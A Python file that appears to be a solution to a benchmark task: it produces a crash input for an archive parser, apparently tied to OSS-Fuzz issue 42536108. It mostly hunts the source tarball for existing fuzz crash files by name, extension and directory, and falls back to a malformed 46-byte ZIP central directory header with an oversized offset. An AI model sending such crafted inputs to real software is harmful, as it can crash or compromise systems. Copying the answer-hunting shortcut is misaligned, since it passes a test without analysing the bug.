import tarfile
import os
import struct


class Solution:
    def _generic_poc(self) -> bytes:
        # Construct a generic 46-byte ZIP central directory header
        sig = 0x02014B50  # "PK\x01\x02"
        vals = [
            sig,
            0,          # version made by
            20,         # version needed to extract
            0,          # general purpose bit flag
            0,          # compression method
            0,          # last mod file time
            0,          # last mod file date
            0,          # crc-32
            0,          # compressed size
            0,          # uncompressed size
            0,          # file name length
            0,          # extra field length
            0,          # file comment length
            0,          # disk number start
            0,          # internal file attributes
            0,          # external file attributes
            0xFFFFFFFF, # relative offset of local header (large to provoke issues)
        ]
        return struct.pack("<I6H3I5H2I", *vals)

    def _is_binary(self, data: bytes) -> bool:
        if not data:
            return False
        ascii_whitespace = {9, 10, 13, 32}
        nontext = 0
        for b in data:
            if b in ascii_whitespace or 32 <= b <= 126:
                continue
            nontext += 1
        ratio = nontext / float(len(data))
        return ratio > 0.3 or b"\x00" in data

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, "r:*") as tar:
                best46 = None
                best46_score = -1
                best_other = None
                best_other_score = -1

                keywords = (
                    "poc",
                    "crash",
                    "oss-fuzz",
                    "ossfuzz",
                    "clusterfuzz",
                    "heap",
                    "overflow",
                    "bug",
                    "issue",
                    "testcase",
                    "regress",
                    "42536108",
                )
                binary_exts = (
                    ".zip",
                    ".rar",
                    ".7z",
                    ".xz",
                    ".gz",
                    ".bz2",
                    ".bz",
                    ".tar",
                    ".tgz",
                    ".lz",
                    ".lz4",
                    ".lzma",
                    ".iso",
                    ".cab",
                    ".ar",
                    ".cpio",
                    ".bin",
                    ".dat",
                )

                for m in tar.getmembers():
                    if not m.isfile():
                        continue
                    size = m.size
                    if size == 0:
                        continue
                    if size != 46 and size > 4096:
                        continue

                    f = tar.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    if not data:
                        continue

                    is_binary = self._is_binary(data)
                    path_lower = m.name.lower()
                    base_lower = os.path.basename(path_lower)
                    ext = os.path.splitext(base_lower)[1]

                    has_keyword = any(k in base_lower or k in path_lower for k in keywords)
                    is_binary_ext = ext in binary_exts
                    in_interesting_dir = any(
                        s in path_lower
                        for s in (
                            "/test",
                            "\\test",
                            "/tests",
                            "\\tests",
                            "/fuzz",
                            "\\fuzz",
                            "/corpus",
                            "\\corpus",
                            "/regress",
                            "\\regress",
                        )
                    ) or "oss-fuzz" in path_lower or "ossfuzz" in path_lower

                    score = 0
                    if is_binary:
                        score += 1
                    else:
                        score -= 2
                    if is_binary_ext:
                        score += 4
                    if has_keyword:
                        score += 3
                    if in_interesting_dir:
                        score += 2

                    if size == 46:
                        if score > best46_score:
                            best46_score = score
                            best46 = data
                    else:
                        if score > best_other_score:
                            best_other_score = score
                            best_other = data

                if best46 is not None and best46_score >= 0:
                    return best46
                if best_other is not None and best_other_score >= 1:
                    return best_other

        except Exception:
            pass

        return self._generic_poc()
